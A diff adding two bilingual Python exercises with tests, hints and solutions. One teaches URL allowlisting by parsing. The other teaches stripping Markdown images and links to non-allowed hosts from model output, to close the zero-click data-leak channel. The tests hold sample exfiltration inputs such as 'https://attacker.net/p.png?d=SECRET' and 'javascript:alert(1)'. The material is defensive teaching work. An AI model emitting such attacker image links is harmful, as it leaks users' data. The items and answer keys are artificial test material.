@@ -1,0 +1,38 @@
+[
+  {
+    "id": "url-allowlist",
+    "title": {
+      "en": "An allowlist that holds",
+      "es": "Una lista de permitidos que aguanta"
+    },
+    "prompt": {
+      "en": "Allowlists must be enforced in code by parsing the URL, never by substring. Write `is_allowed(url, allowed_hosts)`:\n\n- only `https` URLs can pass;\n- the host (from `urllib.parse.urlsplit(url).hostname`, which lowercases it and drops the port and any `user@`) must equal an allowed host or be a subdomain of one (`wiki.corp.example` for `corp.example`).",
+      "es": "Las listas de permitidos se aplican en el código analizando la URL, nunca buscando subcadenas. Escribe `is_allowed(url, allowed_hosts)`:\n\n- solo pueden pasar URLs `https`;\n- el host (de `urllib.parse.urlsplit(url).hostname`, que lo pasa a minúsculas y descarta el puerto y cualquier `usuario@`) debe ser igual a un host permitido o un subdominio suyo (`wiki.corp.example` para `corp.example`)."
+    },
+    "starter": "from urllib.parse import urlsplit\n\n\ndef is_allowed(url, allowed_hosts):\n    raise NotImplementedError\n",
+    "tests": "allow = {\"corp.example\", \"docs.python.org\"}\nassert is_allowed(\"https://corp.example/report\", allow), \"an exact host on the list is allowed\"\nassert is_allowed(\"https://wiki.corp.example/page\", allow), \"subdomains of an allowed host are allowed\"\nassert not is_allowed(\"https://corp.example.attacker.net/x\", allow), \"the substring trap: this host belongs to attacker.net\"\nassert not is_allowed(\"https://evilcorp.example/x\", allow), \"a host that merely ends with the same letters is not a subdomain\"\nassert not is_allowed(\"http://corp.example/x\", allow), \"only https is allowed\"\nassert not is_allowed(\"https://attacker.net/?q=corp.example\", allow), \"an allowed name in the query string does not count\"\nassert not is_allowed(\"https://corp.example@attacker.net/\", allow), \"the part before @ is user info, not the host\"\nassert is_allowed(\"https://CORP.example:443/x\", allow), \"hosts are case-insensitive and the port is not part of the host\"\nassert not is_allowed(\"javascript:alert(1)\", allow), \"non-http schemes are rejected\"\n",
+    "hint": {
+      "en": "Parse once with `urlsplit`. Check `parts.scheme == \"https\"` and that `parts.hostname` is not `None`, then test `host == h or host.endswith(\".\" + h)` for each allowed host.",
+      "es": "Analiza una vez con `urlsplit`. Comprueba `parts.scheme == \"https\"` y que `parts.hostname` no sea `None`, y después prueba `host == h or host.endswith(\".\" + h)` para cada host permitido."
+    },
+    "solution": "from urllib.parse import urlsplit\n\n\ndef is_allowed(url, allowed_hosts):\n    parts = urlsplit(url)\n    host = parts.hostname\n    if parts.scheme != \"https\" or not host:\n        return False\n    return any(host == h or host.endswith(\".\" + h) for h in allowed_hosts)\n"
+  },
+  {
+    "id": "neutralize-links",
+    "title": {
+      "en": "Close the zero-click channel",
+      "es": "Cierra el canal sin clic"
+    },
+    "prompt": {
+      "en": "A Markdown image pointing to an attacker's URL leaks data the moment the client renders it. Write `neutralize(markdown, allowed_hosts)` that rewrites model output before rendering:\n\n- an image `![alt](url)` whose URL is not allowed becomes `[image removed]`;\n- a link `[text](url)` whose URL is not allowed becomes just `text`;\n- images and links to allowed URLs, and everything else, stay unchanged.\n\nA URL is allowed when it uses `https` and its host is exactly one of `allowed_hosts`.",
+      "es": "Una imagen Markdown que apunta a la URL de un atacante filtra datos en cuanto el cliente la muestra. Escribe `neutralize(markdown, allowed_hosts)`, que reescribe la salida del modelo antes de mostrarla:\n\n- una imagen `![alt](url)` cuya URL no está permitida pasa a ser `[image removed]`;\n- un enlace `[texto](url)` cuya URL no está permitida queda solo como `texto`;\n- las imágenes y enlaces a URLs permitidas, y todo lo demás, no cambian.\n\nUna URL está permitida si usa `https` y su host es exactamente uno de `allowed_hosts`."
+    },
+    "starter": "import re\nfrom urllib.parse import urlsplit\n\n\ndef neutralize(markdown, allowed_hosts):\n    raise NotImplementedError\n",
+    "tests": "allow = {\"docs.example\"}\nmd = \"See ![chart](https://docs.example/c.png) and ![x](https://attacker.net/p.png?d=SECRET).\"\nassert neutralize(md, allow) == \"See ![chart](https://docs.example/c.png) and [image removed].\", \"the attacker image goes, the allowed image stays\"\nassert neutralize(\"[docs](https://docs.example/a) or [click](https://attacker.net/?d=1)\", allow) == \"[docs](https://docs.example/a) or click\", \"links to other hosts keep their text but lose the URL\"\nassert neutralize(\"no links here\", allow) == \"no links here\", \"plain text is unchanged\"\nassert neutralize(\"![a](http://docs.example/x.png)\", allow) == \"[image removed]\", \"an http URL is not allowed, even to a known host\"\nassert \"attacker\" not in neutralize(\"![](https://attacker.net/x) [](https://attacker.net/y)\", allow), \"empty alt or link text must not leave the URL behind\"\n",
+    "hint": {
+      "en": "One regular expression can match both forms: `(!?)\\[([^\\]]*)\\]\\(([^)\\s]+)\\)`. Use `re.sub` with a function that looks at the `!` group and checks the URL.",
+      "es": "Una sola expresión regular puede reconocer ambas formas: `(!?)\\[([^\\]]*)\\]\\(([^)\\s]+)\\)`. Usa `re.sub` con una función que mire el grupo `!` y compruebe la URL."
+    },
+    "solution": "import re\nfrom urllib.parse import urlsplit\n\n\ndef _ok(url, allowed_hosts):\n    parts = urlsplit(url)\n    return parts.scheme == \"https\" and parts.hostname in allowed_hosts\n\n\ndef neutralize(markdown, allowed_hosts):\n    def fix(m):\n        bang, text, url = m.group(1), m.group(2), m.group(3)\n        if _ok(url, allowed_hosts):\n            return m.group(0)\n        return \"[image removed]\" if bang else text\n    return re.sub(r\"(!?)\\[([^\\]]*)\\]\\(([^)\\s]+)\\)\", fix, markdown)\n"
+  }
+]
